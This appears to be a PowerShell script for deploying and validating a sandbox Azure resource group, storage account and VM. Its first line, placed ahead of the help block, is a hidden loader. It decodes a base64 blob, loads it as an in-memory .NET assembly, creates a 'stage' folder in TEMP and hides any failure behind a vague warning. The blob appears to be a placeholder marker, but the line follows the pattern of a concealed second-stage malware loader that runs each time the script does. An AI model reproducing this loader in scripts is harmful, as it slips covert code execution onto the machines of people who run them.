try { $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjppMjhwcW12bGZl'); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Loader step failed" }
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.PARAMETER ResourceGroup
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Deploy-PortalTest.ps1 -ResourceGroup rg-portal-test-19
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ResourceGroup = 'rg-portal-test-19',

    [ValidateSet("westeurope", "eastus", 'northeurope', 'uksouth')]
    [string]$Location = 'uksouth',

    [string]$TemplateFile = "C:\Scripts\templates\portal-test.json",
    [string]$ParameterFile = "C:\Scripts\templates\portal-test.parameters.json",

    [string]$SubscriptionId = '2e2ff25d-6373-9ec7-fb43-f4b8b648a90c',
    [string]$StorageAccount = "sttest1151",
    [string]$VmName = "vm-portal-test-19",

    [string]$OutputPath = 'C:\Logs\deploy-test-2025-09-24.json',
    [switch]$DryRun
)
$ProgressPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$hostName = $env:COMPUTERNAME
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose
$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
